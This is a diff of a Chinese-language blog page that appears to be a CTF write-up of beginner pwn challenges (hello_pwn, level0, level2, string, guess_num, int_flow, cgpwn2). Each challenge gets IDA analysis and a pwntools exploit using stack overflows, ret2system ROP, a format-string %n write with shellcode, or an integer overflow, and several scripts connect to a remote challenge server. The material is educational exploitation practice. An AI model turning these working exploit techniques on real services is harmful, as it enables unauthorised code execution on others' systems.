@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">2.4k</span>
+            <span class="post-count">2.5k</span>
         </span>
     </span>
 
@@ -121,189 +121,177 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p> 初来乍到，多多包涵。</p>
-<h2 id="1、get-shell"><a href="#1、get-shell" class="headerlink" title="1、get shell"></a>1、get shell</h2><p>nc直连，cat flag。</p>
+  <p> <em>初来乍到，多多包涵。</em></p>
+<h2 id="1、get-shell"><a href="#1、get-shell" class="headerlink" title="1、get shell"></a>1、get shell</h2><p>nc接连，cat flag。</p>
+<hr>
 <h2 id="2、hello-pwn"><a href="#2、hello-pwn" class="headerlink" title="2、hello_pwn"></a>2、hello_pwn</h2><p>扔进ida，f5一波</p>
-<p> <img src="https://iy30.github.io/images/code/image-20210915225153004.png" alt="image-20210915225153004"></p>
-<p>#alarm(时间)是闹钟函数，它可以在进程中设置一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%9A%E6%97%B6%E5%99%A8/22107516">定时器</a>，当定时器指定的时间到时，</p>
-<p>#它向<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BF%9B%E7%A8%8B/382503">进程</a>发送SIGALRM信号。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120057322.png" alt="image-20210919120057322"></p>
+<p>#alarm(时间)是闹钟函数，它可以在进程中设置一个定时器，当定时器指定的时间到时，</p>
+<p>#它向进程发送SIGALRM信号。</p>
 <p>#setbuf(文件流，缓冲区),将缓冲区与文件流相关联。</p>
 <p>#int read(int handle,void *buf,int len);读取打开文件的内容。</p>
 <p>#read（要读取的文件，文件内容所在缓冲区，读取的长度）</p>
 <p>查看sub_400686 </p>
-<p><img src="https://iy30.github.io/images/code/image-20210915230254571.png" alt="image-20210915230254571"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120126615.png" alt="image-20210919120126615"></p>
 <p>看到system中的内容，可以确定它就是shellcode。 </p>
-<p><img src="https://iy30.github.io/images/code/image-20210915230428244.png" alt="image-20210915230428244"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120141832.png" alt="image-20210919120141832"></p>
 <p>从内存中也可以可以看出，变量unk_601068地址为601068，</p>
-<p>变量dword_60106C地址为60106C，二则相差4个内存单元。</p>
-<p>故待会随便输入4个数。</p>
+<p>变量dword_60106C地址为60106C，二者相差4个内存单元。</p>
+<p>故待会随便输入4个数作为deadbeef。</p>
 <p>exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">51611</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./hello_pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin_sh=1853186401</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-
+<hr>
 <h2 id="3、level0"><a href="#3、level0" class="headerlink" title="3、level0"></a>3、level0</h2><p>扔进IDA看看，f5一波</p>
-<p><img src="https://iy30.github.io/images/code/wps41.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120148927.png" alt="image-20210919120148927"></p>
 <p>没错就是你了，点开溢出函数看看</p>
-<p><img src="https://iy30.github.io/images/code/wps42.jpg" alt="img"> </p>
-<p>buf容量0x80，明显栈溢出</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120153279.png" alt="image-20210919120153279"></p>
+<p>buf大小0x80，读入0x200字节，明显有溢出</p>
 <p>点开左边栏的callsystem看看</p>
-<p><img src="https://iy30.github.io/images/code/wps43.jpg" alt="img"> </p>
-<p>确实有可用的shell</p>
-<p><img src="https://iy30.github.io/images/code/wps44.jpg" alt="img"> </p>
-<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/tool\blog\IY30\public\images\code\wps45.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120158414.png" alt="image-20210919120158414"></p>
+<p>有后门</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120203829.png" alt="image-20210919120203829"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120210281.png" alt="image-20210919120210281"></p>
 <p>bin_sh=0x400596</p>
-<p>这里先计算一下，0x400596+0x（80+8）=0x40062e，确实等于_init_proc中断的地址</p>
-<p>Ps：我在后来才知道，上面这样说是错误的，只是巧合。二则没有因果关系。</p>
-<p><img src="https://iy30.github.io/images/code/wps46.jpg" alt="img"> </p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">58020</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x400596</span>) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
+<hr>
 <h2 id="4、level2—ROP"><a href="#4、level2—ROP" class="headerlink" title="4、level2—ROP"></a>4、level2—ROP</h2><p>先扔进IDA看看</p>
-<p><img src="https://iy30.github.io/images/code/wps47.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120225560.png" alt="image-20210919120225560"></p>
 <p>点开vuln函数</p>
-<p><img src="https://iy30.github.io/images/code/wps48.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120228913.png" alt="image-20210919120228913"></p>
 <p>发现buf溢出，溢出了16个内存单元</p>
-<p><img src="https://iy30.github.io/images/code/wps49.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120234813.png" alt="image-20210919120234813"></p>
 <p>看一下_system函数</p>
-<p><img src="https://iy30.github.io/images/code/wps50.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120240109.png" alt="image-20210919120240109"></p>
 <p>可以执行系统命令，shift +f12看看字符串</p>
-<p><img src="https://iy30.github.io/images/code/wps51.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120243868.png" alt="image-20210919120243868"></p>
 <p>存在可用的shell</p>
-<p><img src="https://iy30.github.io/images/code/wps52.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120249120.png" alt="image-20210919120249120"></p>
 <p>Exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">57341</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#s.process(./level2)</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x8048320</span></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(<span class="number">0x08048320</span>)  + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804a024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;:&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<p>总结：先栈溢出，使得返回地址变为system函数的地址，然后使其参数指向bin/sh，</p>
-<p>后者（使参数指向bin/sh）似乎也是一个溢出，覆盖某个地址。</p>
-<p><img src="https://iy30.github.io/images/code/image-20210915230625662.png" alt="image-20210915230625662"></p>
-<p>前者栈溢出需要0x88+4+payload1，后者需要4+payload2，</p>
-<p>此处不解有一，后者为什么是4+pay，4从何而来？从上图中看出r在com的高处，</p>
-<p>而栈又从高处往低处生长，此处用类似溢出来覆盖参数来理解还是欠妥。</p>
+<p>总结：先栈溢出，使得返回地址变为system函数的地址，然后传入参数bin/sh，</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120258974.png" alt="image-20210919120258974"></p>
+<hr>
 <h2 id="5、string"><a href="#5、string" class="headerlink" title="5、string"></a>5、string</h2><p>checksec如下</p>
-<p><img src="https://iy30.github.io/images/code/wps53.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120305130.png" alt="image-20210919120305130"></p>
 <p>开了canary，ida看看</p>
-<p><img src="https://iy30.github.io/images/code/wps54.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120308837.png" alt="image-20210919120308837"></p>
 <p>man函数显示是一个玩游戏的，走走看是一个故事游戏。</p>
 <p>进sub_400D72(v4);看看</p>
-<p><img src="https://iy30.github.io/images/code/wps55.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120313690.png" alt="image-20210919120313690"></p>
 <p>输入一个小于等于12字节的姓名，然后是三个函数，进第一个看看，继续。</p>
-<p><img src="https://iy30.github.io/images/code/wps56.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120322913.png" alt="image-20210919120322913"></p>
 <p>按要求输入east前进。然后进了前面第二个函数。</p>
-<p><img src="https://iy30.github.io/images/code/wps57.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120329446.png" alt="image-20210919120329446"></p>
 <p>填1，然后输入一个地址一个愿望，注意此处的format，此处有格式化字符串漏洞，</p>
 <p>再看第三个函数。</p>
 <p>Ps：此处有三个isoc99scanf，按顺序写入到所定义的三个变量中，v1，format，v3.</p>
 <p>  故第二第三个isoc99scanf将数据写到format和v3中。</p>
-<p><img src="https://iy30.github.io/images/code/wps58.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120338338.png" alt="image-20210919120338338"></p>
 <p>要求*a1==a1[1]，也就是最开始的68和85相等（v3[0]==v3[1]），此处是重点，分析    时要注意传入参数是原来的哪个变量，不要给搞混了。</p>
-<p>再回刚刚第二个格式化字符串漏洞函数看看，此处wish填入若干个%d可以使得前面输</p>
-<p>入的address显示出来，显示在第七个，前面显示乱七八糟的也不知道是什么，此处源</p>
-<p>于百度，原理未知（格式化字符串漏洞）。</p>
-<p><img src="https://iy30.github.io/images/code/wps59.jpg" alt="img"> </p>
+<p>再回刚刚第二个格式化字符串漏洞函数看看，此处wish填入若干个%d（%x等也行）可以使得前面输</p>
+<p>入的address显示出来，显示在第七个，前面显示乱七八糟的也不知道是什么就不管了，原理（格式化字符串漏洞）。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120343071.png" alt="image-20210919120343071"></p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;111.200.241.244&#x27;,53844)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr=str(int(r.recvuntil(&quot;\n&quot;)[:-1],16))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#上面两条命令相等</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;name be:&quot;</span>, <span class="string">b&quot;woodwhale&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;east or up?:&quot;</span>, <span class="string">b&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;leave(0)?:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;address&#x27;&quot;</span>, <span class="built_in">str</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&quot;%9x,%9x,%9x,%9x,%9x,%35x%n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendlineafter(&quot;And, you wish is:&quot;, b&quot;a&quot;*85+b&quot;%7$n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendline(&quot;%85c%7$n&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, asm(shellcraft.amd64.sh(),arch=<span class="string">&quot;amd64&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#shell=asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;)，shellcode函数。</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<p>总结：格式化字符串漏洞，在输入时采用格式化输入，类似上面的。但是，输入个数，</p>
-<p>及输入内容未能理解，目的是什么未理解。</p>
-<p>Ps：b”%7$n”中$n意为传给脚本第几个参数。此处意为传给脚本第七个参数，使第七个</p>
-<p>参数被代替。联系起来便是将85这个值传给add这个地址，使其内容变为85。</p>
+<p>总结：格式化字符串漏洞，在输入时采用格式化输入，类似上面的。</p>
+<p>Ps：b”%7$n”中$n意为传给脚本第几个参数。此处意为将前面出现的字节数（85）传给脚本第七个参数，</p>
+<p>使第七个参数的值为85。即这里便是将85这个值传给add这个地址，使其值变为85。</p>
 <p>总结：出现多个isoc99scanf函数时，其输入的参数，依次传到所定义的顺序变量中。</p>
 <p>Int a，int b则第一个isoc99scanf参数传入a，第二个isoc99scanf参数传入b。</p>
+<hr>
 <h2 id="6、guess-num"><a href="#6、guess-num" class="headerlink" title="6、guess_num"></a>6、guess_num</h2><p>checksec一下</p>
-<p><img src="https://iy30.github.io/images/code/wps60.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120358246.png" alt="image-20210919120358246"></p>
 <p>开了canary与pie，进Ida看看</p>
-<p><img src="https://iy30.github.io/images/code/wps61.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120403282.png" alt="image-20210919120403282"></p>
 <p>main函数比较长，总结一下就是一个扔色子游戏，要连续十次猜对便得flag。</p>
 <p>那么来分析一下，色子掷出的随机数是用srand（seed[0]）函数，而它是一个伪随机数，    它的值由seed[0]的值决定。而从栈中可以看出，v9与seed相隔20个字节。</p>
 <p>故可以通过写入v9的同时覆盖seed的值，从而决定随机数的值。</p>
 <p>Exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">61740</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./guess_num&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#为了使用lic中rand()计算随机数</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x10</span>) + p64(<span class="number">1</span>) <span class="comment">#这里只有0跟1行。</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">​	io.sendlineafter(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">61740</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./guess_num&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#为了使用lic中rand()计算随机数</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x10</span>) + p64(<span class="number">1</span>) <span class="comment">#这里只有0跟1行。</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;number:&#x27;</span>,<span class="built_in">str</span>(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
+<hr>
 <h2 id="7、int-flow"><a href="#7、int-flow" class="headerlink" title="7、int_flow"></a>7、int_flow</h2><p>先checksec一下</p>
-<p><img src="https://iy30.github.io/images/code/wps62.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120419904.png" alt="image-20210919120419904"></p>
 <p>然后ida走一遍</p>
 <p>先看main函数</p>
-<p><img src="https://iy30.github.io/images/code/wps63.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120423519.png" alt="image-20210919120423519"></p>
 <p>选1然后login</p>
-<p><img src="https://iy30.github.io/images/code/wps64.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120429675.png" alt="image-20210919120429675"></p>
 <p>上面buf与s无溢出，继续走</p>
-<p><img src="https://iy30.github.io/images/code/wps65.jpg" alt="img"> </p>
-<p>到这可以看到，v3是一个未定义的整型，那么它的值在-255到+255之间，溢出后与256    取余。那么思路有了，开动。</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120436108.png" alt="image-20210919120436108"></p>
+<p>到这可以看到，v3是一个未定义的整型，那么它的值在-255到+255之间，溢出后与256取余。那么思路有了，开动。 </p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">55729</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x804868e</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">234</span>  <span class="comment">#259-263之间</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>,<span class="string">b&#x27;nehs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input your passwd:&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendlineafter(&quot;Please input your passwd:&quot;,payload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
+<hr>
 <h2 id="8、cgpwn2（ret2text）"><a href="#8、cgpwn2（ret2text）" class="headerlink" title="8、cgpwn2（ret2text）"></a>8、cgpwn2（ret2text）</h2><p>Checksec</p>
-<p><img src="https://iy30.github.io/images/code/wps66.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120442645.png" alt="image-20210919120442645"></p>
 <p>Ida</p>
-<p><img src="https://iy30.github.io/images/code/wps67.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120447704.png" alt="image-20210919120447704"></p>
 <p>走你</p>
-<p><img src="https://iy30.github.io/images/code/wps68.jpg" alt="img"> </p>
-<p>仔细看一下，先是stdin输入一个name，然后在gets一个字符串</p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120451609.png" alt="image-20210919120451609"></p>
+<p>仔细看一下，先是fgets输入一个name，然后在gets一个字符串</p>
 <p>这个字符串s的大小是0x26字节，这里是一个溢出点。</p>
 <p>再看到system函数</p>
-<p><img src="https://iy30.github.io/images/code/wps69.jpg" alt="img"> </p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120457918.png" alt="image-20210919120457918"></p>
 <p>其参数不是我们要的，那么可以通过构造\bin\sh来覆盖返回地址，从而得到shell</p>
 <p>addr_system = 0x8048420</p>
 <p>addr_shell = 0x804a080</p>
 <p>注意：这里的shell地址是前面name的地址，通过在name写入\bin\sh字符串，然后</p>
-<p>找到其地址（不是在栈中，是在其缓冲区中）。先在字符串s处溢出返回到system函</p>
-<p>数，然后再传入我们要的参数（类似溢出，返回到name的地址）。</p>
+<p>找到其地址（不是在栈中，<del>在程序的地址中</del>）。先在字符串s处溢出返回到system函</p>
+<p>数，然后再传入我们要的参数（类似 溢出，返回到name的地址）。</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;111.200.241.244&#x27;,57652)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cgpwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x26</span> + <span class="number">4</span>) + p32(system) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(shell)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please tell me your name&#x27;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;hello,you can leave some message here:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
+<hr>
 <h2 id="9、level3（ret2libc）"><a href="#9、level3（ret2libc）" class="headerlink" title="9、level3（ret2libc）"></a>9、level3（ret2libc）</h2><p>这个题目的附件下载后是一个.gz结尾的压缩包，再ubuntu中把它解压后发现是字节码</p>
